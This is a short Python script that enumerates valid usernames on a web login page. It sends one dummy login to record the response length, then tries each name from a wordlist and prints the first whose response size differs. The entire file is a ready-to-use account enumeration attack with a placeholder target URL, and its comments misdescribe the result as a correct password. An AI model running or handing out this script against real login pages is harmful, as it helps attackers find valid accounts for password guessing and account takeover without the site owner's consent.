import requests

# Replace with the URL you want to send the request to, should be end with /login
url = "https://www.example.com/login"

# save the user names in a file called users.txt
file_path = 'usernames.txt'

# get a length when an invalid user is submitted and save it as in a variable invalid_user_output_size
data = {
        'username': 'aa',
        'password': 'aa'
        }

response = requests.post(url, data=data)
response_content = response.content
invalid_user_output_size = len(response_content)

# Open the file in read mode
with open(file_path, 'r') as file:
    # Read each line from the file
    for line in file:
        user = line.strip()
    
        data = {
        'username': user,
        'password': 'aa'
        }
        
        response = requests.post(url, data=data)
        response_content = response.content
        response_size = len(response_content)
        
        #if different size is found then the password is correct and exit the loop
        if response_size!=invalid_user_output_size :
            print(user)
            break  
      